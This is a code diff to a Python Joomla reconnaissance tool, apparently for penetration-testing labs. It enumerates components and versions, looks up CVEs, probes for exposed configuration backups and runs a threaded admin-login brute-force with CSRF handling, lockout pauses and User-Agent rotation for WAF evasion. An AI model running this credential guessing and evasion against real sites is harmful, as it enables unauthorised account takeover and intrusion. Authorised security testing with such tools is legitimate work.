@@ -75,9 +75,6 @@ USER_AGENTS = [
 
 # ─────────────────────────────────────────────────────────────────────────────
 # Bundled CVE database for common Joomla components + core versions
-# Format: { "component_name": [ { cve, severity, cvss, affects, description } ] }
-# Severity: CRITICAL, HIGH, MEDIUM, LOW
-# affects: version range string shown to user (not parsed — just informational)
 # ─────────────────────────────────────────────────────────────────────────────
 CVE_DB: dict = {
     # ── Joomla Core ──────────────────────────────────────────────────────────
@@ -101,7 +98,7 @@ CVE_DB: dict = {
             "severity": "HIGH",
             "cvss": 8.8,
             "affects": "3.7.0",
-            "description": "SQL Injection in com_fields com_fields list controller (ordering parameter) — unauthenticated.",
+            "description": "SQL Injection in com_fields list controller (ordering parameter) — unauthenticated.",
         },
         {
             "cve": "CVE-2019-10945",
@@ -314,13 +311,11 @@ SEVERITY_COLOUR = {
 }
 
 # ─────────────────────────────────────────────────────────────────────────────
-# Live CVE lookup via NIST NVD API v2  (no key required, rate-limited to 5/30s)
-# Docs: https://nvd.nist.gov/developers/vulnerabilities
+# Live CVE lookup via NIST NVD API v2
 # ─────────────────────────────────────────────────────────────────────────────
 NVD_API = "https://services.nvd.nist.gov/rest/json/cves/2.0"
 
 def _nvd_severity(metrics: dict) -> tuple:
-    """Extract (severity, cvss_score) from NVD metrics blob."""
     for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
         bucket = metrics.get(key, [])
         if bucket:
@@ -336,11 +331,6 @@ def _nvd_severity(metrics: dict) -> tuple:
 def nvd_search(keyword: str, max_results: int = 10,
                timeout: int = 15,
                api_key: str = None) -> list:
-    """
-    Query NVD for CVEs matching *keyword*.
-    Returns a list of dicts compatible with CVE_DB format.
-    Pass api_key for 50 req/30s instead of the default 5 req/30s.
-    """
     try:
         params = {
             "keywordSearch": keyword,
@@ -369,14 +359,12 @@ def nvd_search(keyword: str, max_results: int = 10,
         metrics  = cve_obj.get("metrics", {})
         severity, score = _nvd_severity(metrics)
 
-        # Description — prefer English
         descriptions = cve_obj.get("descriptions", [])
         desc = next(
             (d["value"] for d in descriptions if d.get("lang") == "en"),
             "No description available.",
         )
 
-        # Affected version ranges (from configurations CPE data)
         affects = "See NVD for version ranges"
         configs = cve_obj.get("configurations", [])
         ranges = []
@@ -405,22 +393,14 @@ def nvd_search(keyword: str, max_results: int = 10,
 def live_cve_scan(session, base_url: str, found_components: list,
                   detected_version: str, timeout: int,
                   api_key: str = None) -> dict:
-    """
-    Run live NVD queries for:
-      - Joomla core (using detected version if available)
-      - Each found component
-    Returns { component_name: [cve_entries] }
-    """
     print_section("Phase 5b — Live NVD CVE Lookup")
     print(dim("  Querying NIST NVD API (rate-limit: 5 requests / 30 seconds)…"))
     if api_key:
         print(dim("  API key provided — using 50 req/30s rate limit."))
 
     live_results = {}
-    # Sleep between calls: 6s without key (5/30s), 0.7s with key (50/30s)
     sleep_between = 0.7 if api_key else 6.0
 
-    # Core query
     core_keyword = f"joomla {detected_version}" if detected_version else "joomla cms"
     print(dim(f"  Searching: '{core_keyword}'"))
     core_cves = nvd_search(core_keyword, max_results=10, timeout=timeout, api_key=api_key)
@@ -431,10 +411,8 @@ def live_cve_scan(session, base_url: str, found_components: list,
     else:
         print(dim("  No live core CVEs returned."))
 
-    # Per-component queries (rate-limited — sleep between calls)
     for comp in found_components:
         name = comp["name"]
-        # Strip "com_" prefix for a cleaner search term
         keyword = f"joomla {name.replace('com_', '')}"
         print(dim(f"  Searching: '{keyword}'"))
         time.sleep(sleep_between)
@@ -453,7 +431,6 @@ def live_cve_scan(session, base_url: str, found_components: list,
 # Brute-force engine
 # ─────────────────────────────────────────────────────────────────────────────
 class BruteResult:
-    """Carries the outcome of a single credential attempt."""
     __slots__ = ("username", "password", "success", "locked_out")
 
     def __init__(self, username: str, password: str,
@@ -468,34 +445,21 @@ def _get_csrf_token(session: requests.Session, admin_url: str,
                     timeout: int) -> Optional[str]:
     """
     Fetch the Joomla admin login page and extract the CSRF token.
-    The user's working script simply grabs the *last* hidden input.
-    We will do the same but exclude standard fields to be safe.
     """
     try:
         resp = session.get(admin_url, timeout=timeout)
         soup = BeautifulSoup(resp.text, "html.parser")
         hidden = soup.find_all("input", type="hidden")
         
-        # Known standard fields to ignore
-        standard_fields = {"username", "passwd", "option", "task", "return"}
-        
-        # Iterate backwards to find the standard anti-csrf token
-        # (usually the last distinct hidden field)
-        for inp in reversed(hidden):
-            name = inp.get("name", "")
-            if name and name not in standard_fields:
-                return name
-                
+        if hidden:
+            return hidden[-1].get("name")
+            
     except Exception:
         pass
     return None
 
 
 def _detect_lockout(html: str) -> bool:
-    """
-    Heuristic check for account lockout / CAPTCHA responses.
-    Returns True if the response strongly suggests a lockout.
-    """
     indicators = [
         "too many login attempts",
         "account has been blocked",
@@ -510,18 +474,11 @@ def _detect_lockout(html: str) -> bool:
 
 def _is_login_failure(soup: BeautifulSoup) -> bool:
     """
-    Return True if the page contains a Joomla login error alert.
-    Simplified to match the user's working script (brute.py) exactly.
+    Return True if the page contains a Joomla login failure alert.
+    Matches the HTB reference script exactly — only checks for
+    'alert-message' div. Avoids false positives from dashboard notices.
     """
-    # Specific Joomla error containers.
-    # brute.py checks specifically for 'alert-message'.
-    # We include a few common variants but REMOVE the generic text search
-    # to avoid false positives from dashboard notices/warnings.
-    for cls in ("alert-message", "alert-error", "alert-danger"):
-        if soup.find("div", class_=cls):
-            return True
-            
-    return False
+    return bool(soup.find("div", {"class": "alert-message"}))
 
 
 def _try_credential(session: requests.Session, admin_url: str,
@@ -533,7 +490,6 @@ def _try_credential(session: requests.Session, admin_url: str,
     """
     token = _get_csrf_token(session, admin_url, timeout)
     if not token:
-        # Can't proceed without a token — transient error
         if verbose:
             print(dim(f"    [?] CSRF fetch failed for {username}:{password} — skipping"))
         return BruteResult(username, password)
@@ -559,39 +515,29 @@ def _try_credential(session: requests.Session, admin_url: str,
     soup    = BeautifulSoup(resp.text, "html.parser")
     failure = _is_login_failure(soup)
 
-    # Success logic matching brute.py:
-    # If the response does NOT contain an error alert, we assume success.
-    # We also check if we've been redirected to the dashboard (index.php) just to be sure,
-    # but primarily rely on the absence of failure signals.
-    
-    on_dashboard = "index.php" in resp.url or "cpanel" in resp.url or "dashboard" in resp.text.lower()
-    
-    # If no failure alert is found, consider it a success.
-    # (The user's script relies *solely* on the absence of 'alert-message')
+    # If no 'alert-message' div found → login succeeded
     logged_in = not failure
+
+    if verbose and not logged_in:
+        # Debugging: show why we think it failed
+        if not token:
+            print(dim(f"    [?] CSRF missing for {username}:{password}"))
+        elif failure:
+             msg = soup.find("div", {"class": "alert-message"}).get_text().strip()[:50]
+             print(dim(f"    [x] Failed: {username}:{password} (Alert: {msg}...)"))
+        else:
+             print(dim(f"    [?] Unknown failure for {username}:{password}"))
 
     return BruteResult(username, password, success=logged_in)
 
 
 def run_brute(args, session: requests.Session) -> list:
-    """
-    Phase 5 — Credential brute-force.
-
-    Features:
-      - Streams wordlist (doesn't load into RAM)
-      - Threaded (--brute-threads, default 1 for stealth)
-      - Lockout detection with automatic pause
-      - Stops per-user on first success
-      - Supports single username or username list
-      - Verbose mode shows failures
-    """
     admin_url  = normalize_url(args.url) + "administrator/"
     timeout    = args.timeout
     verbose    = args.verbose
     found_creds: list = []
     stop_event = threading.Event()
 
-    # Build username list
     if args.userlist:
         try:
             with open(args.userlist, "r", errors="ignore") as f:
@@ -605,33 +551,22 @@ def run_brute(args, session: requests.Session) -> list:
         print(yellow("  [!] No username provided (use -user or -U)"))
         return []
 
-    # Verify wordlist exists
     if not os.path.exists(args.wordlist):
         print(red(f"  [✗] Wordlist not found: {args.wordlist}"))
         return []
 
     lock           = threading.Lock()
-    lockout_until  = [0.0]   # shared mutable: epoch time to resume after lockout
+    lockout_until  = [0.0]
 
     def attempt(username: str, password: str) -> Optional[BruteResult]:
         if stop_event.is_set():
             return None
 
-        # Create a fresh session PER ATTEMPT to avoid cookie collision in threads
-        # and to match brute.py's stateless behavior.
-        # We copy key config from the main session (proxies, verify, headers)
-        local_session = requests.Session()
-        local_session.proxies.update(session.proxies)
-        local_session.verify = session.verify
-        local_session.headers.update(session.headers)
-
-        # Honour lockout pause
         wait = lockout_until[0] - time.monotonic()
         if wait > 0:
             time.sleep(wait)
 
-        # Grab a fresh CSRF token and try login
-        result = _try_credential(local_session, admin_url, username,
+        result = _try_credential(session, admin_url, username,
                                  password, timeout, verbose)
 
         if result.locked_out:
@@ -645,7 +580,7 @@ def run_brute(args, session: requests.Session) -> list:
         if result.success:
             with lock:
                 found_creds.append(result)
-            stop_event.set()   # signal outer loop to stop after this user
+            stop_event.set()
             print(green(f"\n  [✓] VALID CREDENTIAL: {bold(username)}:{bold(password)}"))
         elif verbose:
             print(dim(f"  [-] {username}:{password}"))
@@ -676,8 +611,6 @@ def run_brute(args, session: requests.Session) -> list:
                                 time.sleep(args.brute_delay)
                             yield pw
 
-            # FIX: check stop/found events BEFORE each submit so we don't
-            # flood the thread pool with millions of futures for large wordlists.
             for pw in _stream_passwords():
                 if user_found.is_set() or stop_event.is_set():
                     break
@@ -756,8 +689,6 @@ COMPONENT_SUBFILES = [
 # Rate limiter
 # ─────────────────────────────────────────────────────────────────────────────
 class RateLimiter:
-    """Token-bucket rate limiter — thread-safe."""
-
     def __init__(self, rps: float):
         self._min_interval = 1.0 / rps if rps > 0 else 0.0
         self._lock = threading.Lock()
@@ -774,9 +705,6 @@ class RateLimiter:
             self._last = time.monotonic()
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# Thread-safe atomic counter (replaces done[0] mutable-list hack)
-# ─────────────────────────────────────────────────────────────────────────────
 class AtomicCounter:
     def __init__(self):
         self._val = 0
@@ -793,12 +721,7 @@ class AtomicCounter:
             return self._val
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# Timer-based progress display (no per-future flicker)
-# ─────────────────────────────────────────────────────────────────────────────
 class ProgressBar:
-    """Redraws at a fixed interval from a background thread."""
-
     def __init__(self, total: int, label: str = "Scanning", interval: float = 0.25):
         self._total = total
         self._label = label
@@ -817,14 +740,13 @@ class ProgressBar:
     def stop(self):
         self._stop.set()
         self._thread.join()
-        # Clear the progress line
         print(f"\r{' ' * 80}\r", end="", flush=True)
 
     def _run(self):
         while not self._stop.is_set():
             self._redraw()
             self._stop.wait(self._interval)
-        self._redraw()  # final draw
+        self._redraw()
 
     def _redraw(self):
         done = self._counter.value
@@ -845,18 +767,15 @@ def normalize_url(url: str) -> str:
         url = "http://" + url
     if "?" in url:
         url = url.split("?")[0]
-    # Strip any trailing slashes then add exactly one — prevents double-slash
     url = url.rstrip("/") + "/"
     return url
 
 
 def make_session(args) -> requests.Session:
-    """Build a requests.Session from CLI args (UA, proxy, cookies, headers)."""
     s = requests.Session()
     s.headers["User-Agent"] = args.user_agent
     s.verify = False
 
-    # Proxy support
     if args.proxy:
         proxy_url = args.proxy
         if not re.match(r"^https?://", proxy_url):
@@ -864,7 +783,6 @@ def make_session(args) -> requests.Session:
         s.proxies = {"http": proxy_url, "https": proxy_url}
         print(dim(f"  [proxy] Routing through: {proxy_url}"))
 
-    # Cookie support
     if args.cookie:
         for pair in args.cookie.split(";"):
             pair = pair.strip()
@@ -872,7 +790,6 @@ def make_session(args) -> requests.Session:
                 k, v = pair.split("=", 1)
                 s.cookies.set(k.strip(), v.strip())
 
-    # Extra headers
     if args.header:
         for h in args.header:
             if ":" in h:
@@ -899,13 +816,6 @@ def _next_ua() -> str:
 def _request(method: str, session: requests.Session, url: str, timeout: int,
              rate_limiter: RateLimiter, rotate_ua: bool,
              retries: int = 3, backoff: float = 1.5):
-    """
-    Unified HTTP request with:
-      - rate limiting
-      - optional UA rotation
-      - retry with exponential back-off on transient failures
-      - WAF detection (429 / 503) with automatic slow-down
-    """
     rate_limiter.acquire()
     fn = session.head if method == "HEAD" else session.get
 
@@ -916,7 +826,6 @@ def _request(method: str, session: requests.Session, url: str, timeout: int,
                 kwargs["headers"] = {"User-Agent": _next_ua()}
             resp = fn(url, **kwargs)
 
-            # WAF / rate-limit signal — back off and retry
             if resp.status_code in (429, 503):
                 retry_after = int(resp.headers.get("Retry-After", backoff * (attempt + 1)))
                 time.sleep(min(retry_after, 30))
@@ -953,22 +862,12 @@ def is_index_of(html: str) -> bool:
         return False
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# Fake-200 detection (droopescan feature)
-# Servers that return 200 for *every* URL make component detection unreliable.
-# We probe a known-nonexistent path; if it returns 200 with similar content
-# length to a known-good file, we warn and switch to content-based detection.
-# ─────────────────────────────────────────────────────────────────────────────
 NOT_FOUND_PROBE   = "misc/test/error/404/joomla_recon_probe_a1b2c3.html"
-KNOWN_GOOD_FILE   = "media/system/js/validate.js"   # always present on Joomla
-FAKE_200_THRESHOLD = 25   # byte-length difference below which we consider it fake
+KNOWN_GOOD_FILE   = "media/system/js/validate.js"
+FAKE_200_THRESHOLD = 25
 
 def detect_fake_200(session, base_url: str, timeout: int,
                     rl: "RateLimiter", rotate_ua: bool) -> bool:
-    """
-    Returns True if the server appears to return 200 for all URLs (soft-404).
-    Also prints a warning so the user knows detection may be unreliable.
-    """
     probe_url = base_url + NOT_FOUND_PROBE
     good_url  = base_url + KNOWN_GOOD_FILE
 
@@ -979,9 +878,8 @@ def detect_fake_200(session, base_url: str, timeout: int,
         return False
 
     if probe_resp.status_code != 200:
-        return False   # normal 404 behaviour
+        return False
 
-    # Both returned 200 — check if content lengths are similar
     probe_len = len(probe_resp.content)
     good_len  = len(good_resp.content)
     diff      = abs(probe_len - good_len)
@@ -996,18 +894,10 @@ def detect_fake_200(session, base_url: str, timeout: int,
     return False
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# Redirect following — determine the real base URL after redirects
-# ─────────────────────────────────────────────────────────────────────────────
 def follow_redirect(session, url: str, timeout: int) -> str:
-    """
-    Follow HTTP redirects and return the final base URL (with trailing slash).
-    Handles double-redirects (HTTP→HTTPS, www→non-www, etc.).
-    """
     try:
         resp = session.get(url, timeout=timeout, allow_redirects=True)
         final = resp.url
-        # Strip path back to root
         parsed = urlparse(final)
         base = f"{parsed.scheme}://{parsed.netloc}/"
         if base != url:
@@ -1024,11 +914,7 @@ def print_section(title: str):
     print(f"{C.BOLD}{C.BLUE}{'─' * width}{C.RESET}")
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# CVE lookup
-# ─────────────────────────────────────────────────────────────────────────────
 def lookup_cves(component_name: str) -> list:
-    """Return CVE entries for a component name (case-insensitive key lookup)."""
     key = component_name.lower()
     return CVE_DB.get(key, [])
 
@@ -1044,10 +930,9 @@ def print_cves(cves: list, indent: str = "      "):
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-# Version fingerprinting — vote-based (replaces brittle intersection)
+# Version fingerprinting
 # ─────────────────────────────────────────────────────────────────────────────
 def load_versions_db(xml_path: str) -> dict:
-    """Returns: { file_url: [(md5, version_nb), ...], ... }"""
     db = {}
     if not os.path.exists(xml_path):
         return db
@@ -1066,21 +951,7 @@ def load_versions_db(xml_path: str) -> dict:
 def fingerprint_version(session, base_url, versions_db, threads, timeout,
                          rl, rotate_ua,
                          min_votes: int = 1) -> list:
-    """
-    Vote-based version detection.
-
-    For each file in the DB that returns HTTP 200:
-      - compute its MD5
-      - award a vote to every version whose expected MD5 matches
-
-    Returns the top candidates sorted by vote count (descending), then
-    numerically (descending).  Versions with fewer than min_votes are excluded.
-
-    This is far more resilient than pure intersection: a single modified or
-    missing file no longer wipes out all results.
-    """
     votes: Counter = Counter()
-    files_checked = 0
 
     def check_file(file_url, entries):
         full_url = base_url + file_url
@@ -1095,30 +966,25 @@ def fingerprint_version(session, base_url, versions_db, threads, timeout,
                    for fu, entries in versions_db.items()}
         for future in as_completed(futures):
             result = future.result()
-            files_checked += 1
             votes.update(result)
 
     if not votes:
         return []
 
-
     def ver_key(item):
         ver, count = item
         parts = re.split(r"[.\-]", re.sub(r"[^0-9.\-]", "", ver))
         numeric = [int(p) if p.isdigit() else 0 for p in parts]
-        # primary sort: vote count desc; secondary: version number desc
         return (-count, [-x for x in numeric])
 
     candidates = [(v, c) for v, c in votes.items() if c >= min_votes]
     candidates.sort(key=ver_key)
-
-    return candidates   # list of (version_string, vote_count)
+    return candidates
 
 
 # ─────────────────────────────────────────────────────────────────────────────
 # Interesting URL scan
 # ─────────────────────────────────────────────────────────────────────────────
-# Extra sensitive paths not in the original droopescan list
 EXTRA_SENSITIVE_PATHS = [
     ("configuration.php~",                  "Config backup (tilde) — may expose DB credentials!"),
     ("configuration.php.bak",               "Config backup (.bak) — may expose DB credentials!"),
@@ -1138,13 +1004,11 @@ def scan_interesting_urls(session, base_url, timeout, rl, rotate_ua) -> list:
     found = []
     for path, description in ALL_INTERESTING_URLS:
         full_url = base_url + path
-        # Use GET not HEAD — some servers / WAFs treat them differently,
-        # and interesting URLs should follow redirects to catch HTTPS redirects.
         resp = get(session, full_url, timeout, rl, rotate_ua)
         if resp is not None and resp.status_code in (200, 301, 302, 403):
             found.append({
                 "url":         full_url,
-                "final_url":   resp.url,          # URL after any redirects
+                "final_url":   resp.url,
                 "status":      resp.status_code,
                 "description": description,
             })
@@ -1162,10 +1026,6 @@ def load_components(db_path: str) -> list:
 
 
 def _parse_component_version(xml_content: str) -> Optional[str]:
-    """
-    Extract <version> from a Joomla component XML manifest.
-    Returns the version string or None if not found.
-    """
     try:
         root = ET.fromstring(xml_content)
         ver_elem = root.find(".//version")
@@ -1200,7 +1060,6 @@ def check_component(session, base_url, component, timeout, rl, rotate_ua,
                 "version":    None,
             }
 
-            # Sub-file checks (README, LICENSE, CHANGELOG, MANIFEST)
             for subfile, subfile_type in COMPONENT_SUBFILES:
                 for prefix in [f"components/{component}/",
                                 f"administrator/components/{component}/"]:
@@ -1209,8 +1068,6 @@ def check_component(session, base_url, component, timeout, rl, rotate_ua,
                     if sr is not None and sr.status_code == 200:
                         result["subfiles"].append({"type": subfile_type, "url": sub_url})
 
-            # Index file check — only flag if content-length > 1000 bytes
-            # (avoids false positives from blank index.html placeholder files)
             for dir_path in [f"components/{component}/",
                               f"administrator/components/{component}/"]:
                 for idx in ("index.htm", "index.html", "INDEX.htm", "INDEX.html"):
@@ -1219,7 +1076,6 @@ def check_component(session, base_url, component, timeout, rl, rotate_ua,
                     if ir is not None and ir.status_code == 200 and len(ir.content) > 1000:
                         result["subfiles"].append({"type": "INDEX", "url": idx_url})
 
-            # Directory listing detection
             for dir_path in [f"components/{component}/",
                               f"administrator/components/{component}/"]:
                 dir_url = base_url + dir_path
@@ -1227,7 +1083,6 @@ def check_component(session, base_url, component, timeout, rl, rotate_ua,
                 if gr is not None and gr.status_code == 200 and is_index_of(gr.text):
                     result["explorable"].append(dir_url)
 
-            # Component XML manifest — try to extract version
             comp_short = component.replace("com_", "", 1)
             for xml_path in [
                 f"components/{component}/{comp_short}.xml",
@@ -1282,12 +1137,10 @@ def run_scan(args):
     timeout  = args.timeout
     rotate   = args.rotate_ua
 
-    # Build rate limiter
     rps = args.rate_limit if args.rate_limit > 0 else float("inf")
     rl  = RateLimiter(rps)
 
     if args.delay > 0:
-        # Wrap rl with a fixed delay on top
         orig_acquire = rl.acquire
         def delayed_acquire():
             orig_acquire()
@@ -1302,14 +1155,13 @@ def run_scan(args):
         "core_cves":        CVE_DB.get("__core__", []),
     }
 
-    # ── Connectivity check + redirect following ────────────────────────────
+    # ── Connectivity check ─────────────────────────────────────────────────
     print_section("Target Connectivity")
     resp = head(session, base_url, timeout, rl, rotate)
     if resp is None:
         print(red(f"  [✗] Cannot reach {base_url} — check the URL and try again."))
         sys.exit(1)
 
-    # Follow redirects to get the real base URL (handles HTTP→HTTPS, www→non-www)
     if not args.no_redirect_follow:
         base_url = follow_redirect(session, base_url, timeout)
         results["target"] = base_url
@@ -1367,7 +1219,6 @@ def run_scan(args):
                     if len(candidates) > 6:
                         print(dim(f"      … and {len(candidates) - 6} more"))
 
-                # Core CVE advisory based on detected version
                 print(f"\n  {bold('Core CVE advisory')} (verify version ranges manually):")
                 print_cves(CVE_DB.get("__core__", []), indent="    ")
             else:
@@ -1376,7 +1227,7 @@ def run_scan(args):
         print_section("Phase 2 — Version Fingerprinting")
         print(dim("  Skipped" + (" (brute-force mode)" if args.brute else " (--no-version)")))
 
-    # -- Phase 3: Interesting URLs ──────────────────────────────────────────
+    # ── Phase 3: Interesting URLs ──────────────────────────────────────────
     if not args.brute:
         print_section("Phase 3 — Interesting URL Detection")
         interesting = scan_interesting_urls(session, base_url, timeout, rl, rotate)
@@ -1546,7 +1397,6 @@ Examples:
         """
     )
 
-    # ── Core ────────────────────────────────────────────────────────────────
     parser.add_argument("-u", "--url",      required=True,
                         help="Target Joomla URL")
     parser.add_argument("-t", "--threads",  type=int, default=10,
@@ -1559,7 +1409,6 @@ Examples:
     parser.add_argument("-vv", "--verbose", action="store_true",
                         help="Show failed login attempts during brute-force")
 
-    # ── Proxy / Auth (recon) ────────────────────────────────────────────────
     auth = parser.add_argument_group("Proxy / Session")
     auth.add_argument("--proxy",
                       help="HTTP/HTTPS proxy (e.g. http://127.0.0.1:8080)")
@@ -1568,7 +1417,6 @@ Examples:
     auth.add_argument("--header", action="append", metavar="HEADER",
                       help="Extra HTTP header 'Name: value' (repeatable)")
 
-    # ── WAF evasion / rate limiting ─────────────────────────────────────────
     waf = parser.add_argument_group("WAF Evasion / Rate Limiting")
     waf.add_argument("--rate-limit", type=float, default=0, metavar="RPS",
                      help="Max requests/sec for recon phases (0 = unlimited)")
@@ -1577,7 +1425,6 @@ Examples:
     waf.add_argument("--rotate-ua", action="store_true",
                      help="Rotate User-Agent per request from built-in pool")
 
-    # ── Brute-force ─────────────────────────────────────────────────────────
     brute = parser.add_argument_group("Brute-Force Login (Phase 5)")
     brute.add_argument("--brute", action="store_true",
                        help="Enable brute-force login phase")
@@ -1595,14 +1442,12 @@ Examples:
     brute.add_argument("--lockout-pause", type=float, default=60.0,
                        help="Seconds to pause when lockout detected (default: 60)")
 
-    # ── Live CVE ────────────────────────────────────────────────────────────
     cve = parser.add_argument_group("Live CVE Lookup (Phase 5b)")
     cve.add_argument("--live-cve", action="store_true",
                      help="Query NIST NVD API for live CVEs (requires internet)")
     cve.add_argument("--nvd-key", default=None,
                      help="NVD API key to bypass rate-limit (50 req/30s vs 5/30s)")
 
-    # ── Output ──────────────────────────────────────────────────────────────
     out = parser.add_argument_group("Output")
     out.add_argument("--output", choices=["text", "json", "stdout-json"],
                      default="text",
@@ -1610,7 +1455,6 @@ Examples:
     out.add_argument("--output-file", default=None,
                      help="File for JSON output (default: joomla_recon_results.json)")
 
-    # ── Skip phases ─────────────────────────────────────────────────────────
     skip = parser.add_argument_group("Skip Recon Phases")
     skip.add_argument("--no-components", action="store_true",
                       help="Skip component enumeration")
@@ -1618,7 +1462,6 @@ Examples:
                       help="Skip version fingerprinting")
     skip.add_argument("--no-redirect-follow", action="store_true",
                       help="Do not follow HTTP redirects to determine final base URL")
-
 
     parser.add_argument("--version", action="version",
                         version=f"joomla_recon.py {VERSION}")
@@ -1651,7 +1494,6 @@ def main():
     if not os.path.exists(VERSIONS_XML):
         print(yellow(f"[!] versions.xml not found at: {VERSIONS_XML}"))
 
-    # Brute-force sanity checks (early, before network calls)
     if args.brute:
         if not args.wordlist:
             print(red("[✗] --brute requires -w / --wordlist"))
